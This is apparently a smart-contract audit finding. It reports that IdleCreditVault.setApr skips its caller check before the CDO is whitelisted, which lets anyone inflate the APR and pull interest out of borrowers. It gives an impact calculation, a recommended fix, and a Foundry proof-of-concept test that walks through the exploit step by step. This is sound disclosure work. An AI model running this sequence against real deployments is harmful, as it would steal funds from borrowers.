### Title
Unauthenticated APR update before CDO whitelisting lets an attacker steal borrower interest - (File: `contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`IdleCreditVault.setApr` intentionally skips its caller check while `idleCDO == address(0)`, so any EOA can replace `lastApr` up to the default `maxApr` cap during the deployment window before `setWhitelistedCDO` is called. [1](#0-0)  After the owner links the CDO, the inflated APR controls epoch-interest accounting; the attacker can deposit as a KYC-passing lender and receive the resulting borrower-funded yield through tranche appreciation.

### Finding Description
The permission model requires only the configured `idleCDO` or `manager` to update `lastApr`, but this check is entirely bypassed when `idleCDO` has not yet been assigned. [2](#0-1)  `initialize` sets `maxApr` to `20e18`, leaving an unprivileged caller free to set `lastApr` to a 20% scaled APR. [3](#0-2)  `setWhitelistedCDO` is owner-only but does not reset or validate the previously supplied APR, so the attacker-controlled value survives authorization setup. [4](#0-3) 

In the buffer phase, the attacker deposits into the AA tranche. When `startEpoch` runs, `_calcInterest(getContractValue())` prices the epoch using the poisoned strategy APR and stores the result in `expectedEpochInterest`. [5](#0-4)  `_calcInterest` reads `IdleCreditVault.getApr()`, which returns the attacker-controlled `lastApr`. [6](#0-5)  On `stopEpoch`, IdleCDO pulls `expectedEpochInterest` plus pending withdrawals from the borrower and credits the yield to tranche holders. [7](#0-6) 

### Impact Explanation
The broken invariant is privileged parameter integrity: an unprivileged account gains temporary permission to modify the APR used for borrower liability.

For example, with a 1,000,000 USDC attacker deposit, a 30-day epoch, and `lastApr = 20e18`, `expectedEpochInterest` becomes approximately `16,438.36 USDC`:

```solidity
1_000_000e6 * (20e18 / 100) * 30 days / (365 days * 1e18)
```

If the intended APR is zero or materially lower, the difference is a direct borrower-funded gain to the attacker's tranche position. In minted-interest mode, the same poisoned APR instead mints unbacked strategy tokens into CDO NAV, creating an insolvent claim that later withdrawals can force the borrower to fund. [8](#0-7) 

### Likelihood Explanation
Any EOA can execute the exploit by monitoring deployment and calling `setApr` between strategy/CDO initialization and `setWhitelistedCDO`; no existing guard, epoch phase, KYC check, pause flag, or CDO authorization blocks that call while `idleCDO` is zero. [1](#0-0)  The attacker then needs only the ordinary public deposit path and honest owner/manager epoch calls to realize the inflated value. [9](#0-8)  Atomic deployment would prevent the race operationally, but the contract itself does not enforce atomic authorization setup.

### Recommendation
Remove the `idleCDO == address(0)` authorization bypass from `setApr`; require `msg.sender` to be the configured CDO or manager for every post-initialization APR update. If setup-time APR configuration is required, authorize only `owner()` or `manager`, and preferably pass the CDO address during initialization or atomically call `setWhitelistedCDO` in the deployment transaction.

### Proof of Concept
The following Foundry sequence reproduces the authorization gap and quantifies the borrower-funded gain. It assumes a forked production `IdleCreditVault`/`IdleCDOEpochVariant` pair, an ERC20 with six decimals, and that deployment leaves a transaction window before `setWhitelistedCDO`.

```solidity
// test/foundry/MissingAprAuthorization.t.sol
function test_UnprivilegedAprUpdateInflatesEpochInterest() public {
    uint256 depositAmount = 1_000_000e6;
    uint256 forcedApr = 20e18;

    // Owner deploys and initializes the strategy and epoch CDO.
    vm.startPrank(owner);
    strategy.initialize(
        address(underlying),
        owner,
        manager,
        borrower,
        "Borrower",
        0 // intended APR
    );
    cdo.initialize(
        0,
        address(underlying),
        governanceFund,
        owner,
        address(0),
        address(strategy),
        50_000
    );
    vm.stopPrank();

    // Missing authorization while strategy.idleCDO() == address(0).
    vm.prank(attacker);
    strategy.setApr(forcedApr);
    assertEq(strategy.lastApr(), forcedApr);

    // Owner completes authorization setup; the poisoned APR is preserved.
    vm.prank(owner);
    strategy.setWhitelistedCDO(address(cdo));

    // Attacker deposits during the buffer phase.
    deal(address(underlying), attacker, depositAmount);
    vm.startPrank(attacker);
    underlying.approve(address(cdo), depositAmount);
    cdo.depositAA(depositAmount);
    vm.stopPrank();

    // Honest manager starts the epoch and borrower receives principal.
    vm.prank(manager);
    cdo.startEpoch();
    assertEq(underlying.balanceOf(borrower), depositAmount);

    // Borrower is solvent and approves principal plus forced interest.
    uint256 expectedInterest =
        depositAmount * (forcedApr / 100) * cdo.epochDuration()
            / (365 days * 1e18);
    assertApproxEqAbs(expectedInterest, 16_438e6, 1e6);

    deal(address(underlying), borrower, depositAmount + expectedInterest);
    vm.prank(borrower);
    underlying.approve(address(cdo), type(uint256).max);

    vm.warp(cdo.epochEndDate() + 1);
    vm.prank(manager);
    cdo.stopEpoch(0, 0);

    // The attacker-controlled APR was realized in tranche NAV.
    assertGt(cdo.virtualPrice(cdo.AATranche()), cdo.oneToken());
    assertEq(
        underlying.balanceOf(address(strategy)),
        depositAmount + expectedInterest
    );
}
```
